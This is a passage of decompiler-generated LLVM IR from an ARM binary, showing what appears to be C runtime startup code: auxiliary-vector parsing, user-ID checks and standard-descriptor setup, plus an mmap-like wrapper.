  uselistorder i32 %v1_1350c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_13558(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13558:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_1356c = call i32 @function_10a14(i32 %arg1, i32 1)
  %v3_13574 = icmp eq i32 %v2_1356c, -1
  store i32 124088, i32* @r3, align 4
  br i1 %v3_13574, label %dec_label_pc_13580, label %dec_label_pc_13598

dec_label_pc_13580:                               ; preds = %dec_label_pc_13558
  %v0_13584 = load i32, i32* %r5.global-to-local, align 4
  %v3_1358c = call i32 @function_107ec(i32 ptrtoint ([10 x i8]* @global_var_16184.411 to i32), i32 %v0_13584)
  %v1_13590 = load i32, i32* %r4.global-to-local, align 4
  %v1_13594 = icmp ne i32 %v3_1358c, %v1_13590
  call void @__pseudo_cond_branch(i1 %v1_13594, i32 ptrtoint (i32* @global_var_128ec.412 to i32))
  br label %dec_label_pc_13598

dec_label_pc_13598:                               ; preds = %dec_label_pc_13558, %dec_label_pc_13580
  %v1_135a0 = phi i32 [ %v2_1356c, %dec_label_pc_13558 ], [ %v3_1358c, %dec_label_pc_13580 ]
  ret i32 %v1_135a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13598, { 1, 0 }
}

define i32 @function_135ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_135ac:
  %r4.global-to-local = alloca i32, align 4
  store i32 124088, i32* %r4.global-to-local, align 4
  %v4_135bc = load i32, i32* inttoptr (i32 124180 to i32*), align 4
  %v1_135c0 = inttoptr i32 %v4_135bc to i32*
  %v2_135c0 = load i32, i32* %v1_135c0, align 4
  %v2_135c4 = icmp eq i32 %v2_135c0, 0
  br i1 %v2_135c4, label %dec_label_pc_135cc, label %dec_label_pc_13600

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135ac
  %v4_135d0 = load i32, i32* inttoptr (i32 124140 to i32*), align 4
  %v2_135d8 = icmp eq i32 %v4_135d0, 0
  store i32 4096, i32* %v1_135c0, align 4
  br i1 %v2_135d8, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_135cc
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_135cc, %bb
  %v2_135e4 = xor i1 %v2_135d8, true
  call void @__pseudo_cond_branch(i1 %v2_135e4, i32 %v4_135d0)
  %v0_135ec = load i32, i32* %r4.global-to-local, align 4
  %v2_135f4 = icmp eq i32 %v0_135ec, 39900
  br i1 %v2_135f4, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_135fc = xor i1 %v2_135f4, true
  call void @__pseudo_cond_branch(i1 %v2_135fc, i32 ptrtoint (i32* @global_var_148dc.417 to i32))
  br label %dec_label_pc_13600

dec_label_pc_13600:                               ; preds = %dec_label_pc_135ac, %bb6
  %v1_13604 = load i32, i32* @r0, align 4
  ret i32 %v1_13604

; uselistorder directives
  uselistorder i1 %v2_135f4, { 1, 0 }
  uselistorder label %dec_label_pc_13600, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_13618(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13618:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_13620 = add i32 %tmp, 4
  store i32 %v1_13620, i32* %ip.global-to-local, align 4
  %v2_13624 = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 124088, i32* @r6, align 4
  %v3_13630 = mul i32 %arg2, 4
  store i32 %v3_13630, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_13638 = load i32, i32* inttoptr (i32 124108 to i32*), align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_13640 = ptrtoint i32* %stack_var_-120 to i32
  %v4_13644 = load i32, i32* inttoptr (i32 124116 to i32*), align 4
  store i32 %v4_13644, i32* %r4.global-to-local, align 4
  %v2_1364c = add i32 %v1_13620, %v3_13630
  store i32 %v2_1364c, i32* %ip.global-to-local, align 4
  %v9_13650 = icmp eq i32 %v2_1364c, %v2_13624
  store i1 %v9_13650, i1* %cpsr_z.global-to-local, align 1
  %v2_13654 = inttoptr i32 %v4_13638 to i32*
  store i32 %arg7, i32* %v2_13654, align 4
  store i32 688, i32* %r2.global-to-local, align 4
  %v0_13660 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_13650, label %bb, label %.critedge

bb:                                               ; preds = %dec_label_pc_13618
  %v1_13664 = load i32, i32* @r7, align 4
  %v2_13664 = load i32, i32* %r5.global-to-local, align 4
  %v3_13664 = add i32 %v2_13664, %v1_13664
  store i32 %v3_13664, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_1e768.408, align 4
  %v0_1366c = load i32, i32* %ip.global-to-local, align 4
  %v1_1366c = load i32, i32* %r4.global-to-local, align 4
  %v2_1366c = inttoptr i32 %v1_1366c to i32*
  store i32 %v0_1366c, i32* %v2_1366c, align 4
  store i32 120, i32* @r2, align 4
  %v1_13678 = load i32, i32* %r3.global-to-local, align 4
  %v2_13678 = load i32, i32* %r4.global-to-local, align 4
  %v3_13678 = inttoptr i32 %v2_13678 to i32*
  store i32 %v1_13678, i32* %v3_13678, align 4
  br label %bb57

.critedge:                                        ; preds = %dec_label_pc_13618
  store i32 %arg6, i32* @global_var_1e768.408, align 4
  %v0_1366c.c = load i32, i32* %ip.global-to-local, align 4
  %v1_1366c.c = load i32, i32* %r4.global-to-local, align 4
  %v2_1366c.c = inttoptr i32 %v1_1366c.c to i32*
  store i32 %v0_1366c.c, i32* %v2_1366c.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb57

bb57:                                             ; preds = %.critedge, %bb
  %v2_13684 = bitcast i32* %stack_var_-120 to i8*
  %v3_13684 = call i32 @function_11060(i8* %v2_13684, i32 0)
  %v0_13688 = load i32, i32* %r4.global-to-local, align 4
  %v1_13688 = inttoptr i32 %v0_13688 to i32*
  %storemerge.pre = load i32, i32* %v1_13688, align 4
  br label %dec_label_pc_13694

dec_label_pc_13694:                               ; preds = %dec_label_pc_13694, %bb57
  %storemerge = phi i32 [ %storemerge.pre, %bb57 ], [ %v4_13694, %dec_label_pc_13694 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_13694 = inttoptr i32 %storemerge to i32*
  %v2_13694 = load i32, i32* %v1_13694, align 4
  store i32 %v2_13694, i32* %r3.global-to-local, align 4
  %v4_13694 = add i32 %storemerge, 4
  store i32 %v4_13694, i32* %r2.global-to-local, align 4
  %v2_13698 = icmp eq i32 %v2_13694, 0
  br i1 %v2_13698, label %dec_label_pc_136a4, label %dec_label_pc_13694

dec_label_pc_136a4:                               ; preds = %dec_label_pc_13694
  store i32 %v4_13694, i32* @r4, align 4
  store i32 %v2_13640, i32* @r5, align 4
  %v1_136c829 = inttoptr i32 %v4_13694 to i32*
  %v2_136c830 = load i32, i32* %v1_136c829, align 4
  store i32 %v2_136c830, i32* %r3.global-to-local, align 4
  %v2_136cc32 = icmp eq i32 %v2_136c830, 0
  store i1 %v2_136cc32, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136cc32, label %dec_label_pc_136d4, label %dec_label_pc_136b0

dec_label_pc_136b0:                               ; preds = %dec_label_pc_136a4, %dec_label_pc_136c8
  %v5_136b4 = phi i32 [ %v2_136c8, %dec_label_pc_136c8 ], [ %v2_136c830, %dec_label_pc_136a4 ]
  %v2_136b0 = icmp ugt i32 %v5_136b4, 13
  %v7_136b0 = icmp eq i32 %v5_136b4, 14
  store i1 %v7_136b0, i1* %cpsr_z.global-to-local, align 1
  %v2_136b4 = xor i1 %v2_136b0, true
  %v3_136b4 = or i1 %v7_136b0, %v2_136b4
  br i1 %v3_136b4, label %bb58, label %bb59

bb58:                                             ; preds = %dec_label_pc_136b0
  %v6_136b4 = and i32 %v5_136b4, 536870912
  %v7_136b4 = icmp ne i32 %v6_136b4, 0
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_136b0, %bb58
  %v1_136c0 = phi i1 [ %v2_136b0, %dec_label_pc_136b0 ], [ %v7_136b4, %bb58 ]
  %v2_136b8 = xor i1 %v1_136c0, true
  %v3_136b8 = or i1 %v7_136b0, %v2_136b8
  br i1 %v3_136b8, label %bb60, label %dec_label_pc_136c8

bb60:                                             ; preds = %bb59
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_136c8

dec_label_pc_136c8:                               ; preds = %bb59, %bb60
  call void @__pseudo_cond_branch(i1 %v3_136b8, i32 ptrtoint (i32* @global_var_11110.422 to i32))
  %v0_136c4 = load i32, i32* @r4, align 4
  %v1_136c4 = add i32 %v0_136c4, 8
  store i32 %v1_136c4, i32* @r4, align 4
  %v1_136c8 = inttoptr i32 %v1_136c4 to i32*
  %v2_136c8 = load i32, i32* %v1_136c8, align 4
  store i32 %v2_136c8, i32* %r3.global-to-local, align 4
  %v2_136cc = icmp eq i32 %v2_136c8, 0
  store i1 %v2_136cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136cc, label %dec_label_pc_136d4, label %dec_label_pc_136b0

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136c8, %dec_label_pc_136a4
  %v1_136d8 = call i32 @function_15ae4(i32 %v2_13640)
  store i32 %v1_136d8, i32* @r0, align 4
  %v1_136dc = call i32 @function_135ac(i32 %v1_136d8)
  store i32 %v1_136dc, i32* @r0, align 4
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* @r2, align 4
  %v0_136e8 = load i32, i32* @r6, align 4
  %v2_136e8 = add i32 %v0_136e8, 92
  %v3_136e8 = inttoptr i32 %v2_136e8 to i32*
  %v4_136e8 = load i32, i32* %v3_136e8, align 4
  store i32 %tmp52, i32* @r3, align 4
  %v2_136f0 = icmp eq i32 %tmp53, 0
  store i1 %v2_136f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_136f0, label %bb61, label %bb62

bb61:                                             ; preds = %dec_label_pc_136d4
  store i32 4096, i32* @r2, align 4
  br label %bb62

bb62:                                             ; preds = %dec_label_pc_136d4, %bb61
  %v0_136fc = phi i32 [ %tmp53, %dec_label_pc_136d4 ], [ 4096, %bb61 ]
  %v3_136f8 = icmp eq i32 %tmp52, -1
  %v8_136f8 = icmp eq i32 %tmp52, -1
  store i1 %v8_136f8, i1* %cpsr_z.global-to-local, align 1
  %v2_136fc = inttoptr i32 %v4_136e8 to i32*
  store i32 %v0_136fc, i32* %v2_136fc, align 4
  br i1 %v3_136f8, label %dec_label_pc_13704, label %dec_label_pc_1372c

dec_label_pc_13704:                               ; preds = %bb62
  %v0_13704 = call i32 @function_13a1c()
  store i32 %v0_13704, i32* @r0, align 4
  store i32 %v0_13704, i32* @r4, align 4
  %v0_1370c = call i32 @function_13a78()
  store i32 %v0_1370c, i32* @r0, align 4
  %v0_13710 = load i32, i32* @r4, align 4
  %v9_13710 = icmp eq i32 %v0_13710, %v0_1370c
  store i1 %v9_13710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13710, label %dec_label_pc_13718, label %dec_label_pc_13754

dec_label_pc_13718:                               ; preds = %dec_label_pc_13704
  %v1_13718 = call i32 @function_13be4(i32 %v0_1370c)
  store i32 %v1_13718, i32* @r0, align 4
  store i32 %v1_13718, i32* @r4, align 4
  %v0_13720 = call i32 @function_13a64()
  store i32 %v0_13720, i32* @r0, align 4
  %v0_13724 = load i32, i32* @r4, align 4
  %v9_13724 = icmp eq i32 %v0_13724, %v0_13720
  store i1 %v9_13724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13724, label %dec_label_pc_1372c, label %dec_label_pc_13754

dec_label_pc_1372c:                               ; preds = %dec_label_pc_13718, %bb62
  store i32 %tmp52, i32* @r2, align 4
  store i1 %v8_136f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_136f8, label %dec_label_pc_13778, label %dec_label_pc_13738

dec_label_pc_13738:                               ; preds = %dec_label_pc_1372c
  store i32 %tmp51, i32* @r3, align 4
  %v9_1373c = icmp eq i32 %tmp52, %tmp51
  store i1 %v9_1373c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1373c, label %dec_label_pc_13744, label %dec_label_pc_13754

dec_label_pc_13744:                               ; preds = %dec_label_pc_13738
  store i32 %tmp50, i32* @r2, align 4
  store i32 %tmp49, i32* @r3, align 4
  %v9_1374c = icmp eq i32 %tmp50, %tmp49
  store i1 %v9_1374c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1374c, label %dec_label_pc_13778, label %dec_label_pc_13754

dec_label_pc_13754:                               ; preds = %dec_label_pc_13738, %dec_label_pc_13718, %dec_label_pc_13704, %dec_label_pc_13744
  %v2_1375c = call i32 @function_13558(i32 0, i32 32768)
  %v2_13768 = call i32 @function_13558(i32 1, i32 32770)
  %v2_13774 = call i32 @function_13558(i32 2, i32 32770)
  store i32 %v2_13774, i32* @r0, align 4
  br label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13744, %dec_label_pc_1372c, %dec_label_pc_13754
  %v0_13778 = load i32, i32* @r7, align 4
  %v1_13778 = inttoptr i32 %v0_13778 to i32*
  %v2_13778 = load i32, i32* %v1_13778, align 4
  store i32 %v2_13778, i32* %r2.global-to-local, align 4
  store i32 208, i32* %r3.global-to-local, align 4
  %v1_13780 = load i32, i32* @r6, align 4
  %v3_13780 = add i32 %v1_13780, 208
  %v4_13780 = inttoptr i32 %v3_13780 to i32*
  store i32 %v2_13778, i32* %v4_13780, align 4
  %v0_13784 = load i32, i32* @r7, align 4
  %v1_13784 = inttoptr i32 %v0_13784 to i32*
  %v2_13784 = load i32, i32* %v1_13784, align 4
  store i32 %v2_13784, i32* @r4, align 4
  %v2_13788 = icmp eq i32 %v2_13784, 0
  store i1 %v2_13788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13788, label %dec_label_pc_1382c.lr.ph, label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %dec_label_pc_13778
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_13794 = load i32, i32* @r6, align 4
  %v2_13794 = add i32 %v0_13794, 112
  %v3_13794 = inttoptr i32 %v2_13794 to i32*
  %v4_13794 = load i32, i32* %v3_13794, align 4
  store i32 %v4_13794, i32* %r3.global-to-local, align 4
  %v2_13798 = inttoptr i32 %v4_13794 to i32*
  store i32 %v2_13784, i32* %v2_13798, align 4
  %v0_137a0 = load i32, i32* @r7, align 4
  %v1_137a0 = inttoptr i32 %v0_137a0 to i32*
  %v2_137a0 = load i32, i32* %v1_137a0, align 4
  %v4_137a4 = call i32 @function_15720(i32 %v2_137a0, i32 47, i32 %v2_13778, i32 %v4_13794)
  store i32 %v4_137a4, i32* @r0, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v2_137ac = icmp eq i32 %v4_137a4, 0
  store i1 %v2_137ac, i1* %cpsr_z.global-to-local, align 1
  %v0_137b0 = load i32, i32* @r6, align 4
  %v2_137b0 = add i32 %v0_137b0, 60
  %v3_137b0 = inttoptr i32 %v2_137b0 to i32*
  %v4_137b0 = load i32, i32* %v3_137b0, align 4
  store i32 %v4_137b0, i32* %r2.global-to-local, align 4
  br i1 %v2_137ac, label %.thread46, label %bb63

.thread46:                                        ; preds = %dec_label_pc_13790
  %v2_137b847 = inttoptr i32 %v4_137b0 to i32*
  store i32 0, i32* %v2_137b847, align 4
  br label %dec_label_pc_1382c.lr.ph

bb63:                                             ; preds = %dec_label_pc_13790
  %v2_137b4 = add i32 %v4_137a4, 1
  store i32 %v2_137b4, i32* %r3.global-to-local, align 4
  %v2_137b8 = inttoptr i32 %v4_137b0 to i32*
  store i32 %v4_137a4, i32* %v2_137b8, align 4
  %v1_137bc = load i32, i32* %r3.global-to-local, align 4
  %v2_137bc = load i32, i32* %r2.global-to-local, align 4
  %v3_137bc = inttoptr i32 %v2_137bc to i32*
  store i32 %v1_137bc, i32* %v3_137bc, align 4
  br label %dec_label_pc_1382c.lr.ph

dec_label_pc_1382c.lr.ph:                         ; preds = %.thread46, %bb63, %dec_label_pc_13778
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_137d4 = load i32, i32* @r6, align 4
  %v2_137d4 = add i32 %v0_137d4, -12
  store i32 %v2_137d4, i32* %r8.global-to-local, align 4
  store i32 684, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %arg5, i32* @global_var_1e764.406, align 4
  %v2_13804 = icmp eq i32 %v0_13660, 0
  store i1 %v2_13804, i1* %cpsr_z.global-to-local, align 1
  %v2_1380c = xor i1 %v2_13804, true
  call void @__pseudo_cond_branch(i1 %v2_1380c, i32 %v0_13660)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_13820 = load i32, i32* @r6, align 4
  %v2_13820 = add i32 %v0_13820, -12
  store i32 %v2_13820, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1382c

dec_label_pc_1382c:                               ; preds = %dec_label_pc_1382c.dec_label_pc_1382c_crit_edge, %dec_label_pc_1382c.lr.ph
  %v1_1382c = phi i32 [ %v1_13838, %dec_label_pc_1382c.dec_label_pc_1382c_crit_edge ], [ 0, %dec_label_pc_1382c.lr.ph ]
  %v0_1382c = phi i32 [ %v0_1382c.pre, %dec_label_pc_1382c.dec_label_pc_1382c_crit_edge ], [ %v2_13820, %dec_label_pc_1382c.lr.ph ]
  %v4_1382c = mul i32 %v1_1382c, 4
  %v5_1382c = add i32 %v4_1382c, %v0_1382c
  %v6_1382c = inttoptr i32 %v5_1382c to i32*
  %v7_1382c = load i32, i32* %v6_1382c, align 4
  store i32 %v7_1382c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_1382c)
  %v0_13838 = load i32, i32* %r4.global-to-local, align 4
  %v1_13838 = add i32 %v0_13838, 1
  store i32 %v1_13838, i32* %r4.global-to-local, align 4
  %v1_1383c = load i32, i32* %r5.global-to-local, align 4
  %v3_1383c = icmp ult i32 %v1_13838, %v1_1383c
  %v9_1383c = icmp eq i32 %v1_13838, %v1_1383c
  store i1 %v9_1383c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1383c, label %dec_label_pc_1382c.dec_label_pc_1382c_crit_edge, label %dec_label_pc_13844

dec_label_pc_1382c.dec_label_pc_1382c_crit_edge:  ; preds = %dec_label_pc_1382c
  %v0_1382c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1382c

dec_label_pc_13844:                               ; preds = %dec_label_pc_1382c
  %v0_13848.pre = load i32, i32* @r6, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  %v2_13848 = add i32 %v0_13848.pre, 104
  %v3_13848 = inttoptr i32 %v2_13848 to i32*
  %v4_13848 = load i32, i32* %v3_13848, align 4
  store i32 %v4_13848, i32* %r2.global-to-local, align 4
  store i32 %v4_13848, i32* %r3.global-to-local, align 4
  %v2_13850 = icmp eq i32 %v4_13848, 0
  store i1 %v2_13850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13850, label %dec_label_pc_13868, label %dec_label_pc_13858

dec_label_pc_13858:                               ; preds = %dec_label_pc_13844
  call void @__pseudo_branch(i32 %v4_13848)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13864 = load i32, i32* @r0, align 4
  %v2_13864 = inttoptr i32 %v1_13864 to i32*
  store i32 0, i32* %v2_13864, align 4
  %v0_1386c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13868

dec_label_pc_13868:                               ; preds = %dec_label_pc_13844, %dec_label_pc_13858
  %v0_1386c = phi i32 [ %v0_13848.pre, %dec_label_pc_13844 ], [ %v0_1386c.pre, %dec_label_pc_13858 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1386c = add i32 %v0_1386c, 80
  %v3_1386c = inttoptr i32 %v2_1386c to i32*
  %v4_1386c = load i32, i32* %v3_1386c, align 4
  store i32 %v4_1386c, i32* %r2.global-to-local, align 4
  store i32 %v4_1386c, i32* %r3.global-to-local, align 4
  %v2_13874 = icmp eq i32 %v4_1386c, 0
  store i1 %v2_13874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13874, label %dec_label_pc_1388c, label %dec_label_pc_1387c

dec_label_pc_1387c:                               ; preds = %dec_label_pc_13868
  call void @__pseudo_branch(i32 %v4_1386c)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_13888 = load i32, i32* @r0, align 4
  %v2_13888 = inttoptr i32 %v1_13888 to i32*
  store i32 0, i32* %v2_13888, align 4
  %v0_13890.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %dec_label_pc_13868, %dec_label_pc_1387c
  %v0_13890 = phi i32 [ %v0_1386c, %dec_label_pc_13868 ], [ %v0_13890.pre, %dec_label_pc_1387c ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_13890 = add i32 %v0_13890, 28
  %v3_13890 = inttoptr i32 %v2_13890 to i32*
  %v4_13890 = load i32, i32* %v3_13890, align 4
  store i32 %v4_13890, i32* %r3.global-to-local, align 4
  %v1_13898 = inttoptr i32 %v4_13890 to i32*
  %v2_13898 = load i32, i32* %v1_13898, align 4
  store i32 %v2_13898, i32* %r2.global-to-local, align 4
  %v0_1389c = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_138a8 = call i32 @function_12c10(i32 %v0_1389c)
  %v0_138ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_138ac, label %bb64, label %.thread8

bb64:                                             ; preds = %dec_label_pc_1388c
  %v2_138ac = load i32, i32* %r4.global-to-local, align 4
  %v8_138b0 = shl i32 %v2_138ac, %v1_138a8
  %v9_138b0 = and i32 %v8_138b0, %v1_138a8
  %v2_138b4 = load i32, i32* %ip.global-to-local, align 4
  %v8_138b4 = shl i32 %v2_138b4, %v9_138b0
  %v9_138b4 = and i32 %v8_138b4, %v9_138b0
  %v2_138b8 = trunc i32 %v9_138b4 to i16
  %v4_138b8 = inttoptr i32 %v9_138b4 to i16*
  store i16 %v2_138b8, i16* %v4_138b8, align 2
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1388c, %bb64
  %v10_138cc = phi i32 [ %v1_138a8, %dec_label_pc_1388c ], [ 0, %bb64 ]
  ret i32 %v10_138cc

; uselistorder directives
  uselistorder i32 %v9_138b4, { 1, 0 }
  uselistorder i32 %v1_138a8, { 1, 0, 2 }
  uselistorder i32 %v0_13848.pre, { 1, 0 }
  uselistorder i32 %v1_1383c, { 1, 0 }
  uselistorder i32 %v1_13838, { 3, 2, 1, 0 }
  uselistorder i32 %v4_137b0, { 1, 0, 2 }
  uselistorder i1 %v8_136f8, { 1, 2, 0 }
  uselistorder i32 %v2_136c8, { 1, 2, 0 }
  uselistorder i1 %v2_136b0, { 1, 0 }
  uselistorder i32 %v4_13694, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_13660, { 1, 0 }
  uselistorder i32 %v3_13630, { 1, 0 }
  uselistorder i32 %tmp52, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp49, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 15, 16, 17, 18, 7, 8, 9, 10, 11, 12, 13, 14, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 0, 12, 13, 14, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 8, 4, 0, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 1, 18 }
  uselistorder i32 (i32)* @function_12c10, { 0, 5, 6, 4, 3, 2, 1 }
  uselistorder i32 47, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @function_13558, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0, 2 }
  uselistorder i32 120, { 0, 2, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1388c, { 1, 0 }
  uselistorder label %dec_label_pc_13868, { 1, 0 }
  uselistorder label %dec_label_pc_1382c.lr.ph, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13754, { 3, 0, 1, 2 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_136c8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_136b0, { 1, 0 }
}

define i32 @function_138ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_138ec:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_138ec = load i32, i32* @r4, align 4
  store i32 %v3_138ec, i32* %stack_var_-16, align 4
  %v3_138f8 = urem i32 %arg3, 4096
  %v2_138fc = icmp eq i32 %v3_138f8, 0
  br i1 %v2_138fc, label %dec_label_pc_13918, label %dec_label_pc_13904

dec_label_pc_13904:                               ; preds = %dec_label_pc_138ec
  %v0_13904 = call i32 @function_11008()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13910 = inttoptr i32 %v0_13904 to i32*
  store i32 22, i32* %v2_13910, align 4
  %v0_13948.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13948

dec_label_pc_13918:                               ; preds = %dec_label_pc_138ec
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13944, label %dec_label_pc_13934

dec_label_pc_13934:                               ; preds = %dec_label_pc_13918
  %v0_13934 = call i32 @function_11008()
  %v0_13938 = load i32, i32* %r4.global-to-local, align 4
  %v1_13938 = sub i32 0, %v0_13938
  %v2_1393c = inttoptr i32 %v0_13934 to i32*
  store i32 %v1_13938, i32* %v2_1393c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13944

dec_label_pc_13944:                               ; preds = %dec_label_pc_13918, %dec_label_pc_13934
  %v0_13944 = phi i32 [ %arg1, %dec_label_pc_13918 ], [ -1, %dec_label_pc_13934 ]
  store i32 %v0_13944, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13948

dec_label_pc_13948:                               ; preds = %dec_label_pc_13904, %dec_label_pc_13944
  %v0_13948 = phi i32 [ %v0_13948.pre, %dec_label_pc_13904 ], [ %v0_13944, %dec_label_pc_13944 ]
  %v2_1394c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1394c, i32* @r4, align 4
  ret i32 %v0_13948

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13948, { 1, 0 }
  uselistorder label %dec_label_pc_13944, { 1, 0 }
}

define i32 @function_13954(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13954:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13954 = load i32, i32* @r4, align 4
  %v6_13954 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1395c = icmp eq i32 %arg2, 0
  store i32 124088, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1395c, label %dec_label_pc_139b0, label %dec_label_pc_13974

dec_label_pc_13974:                               ; preds = %dec_label_pc_13954
  %v1_13974 = add i32 %arg2, 4
  %v2_13974 = inttoptr i32 %v1_13974 to i32*
  %v3_13974 = load i32, i32* %v2_13974, align 4
  store i32 %v3_13974, i32* @r3, align 4
  %v1_13978 = and i32 %v3_13974, 67108864
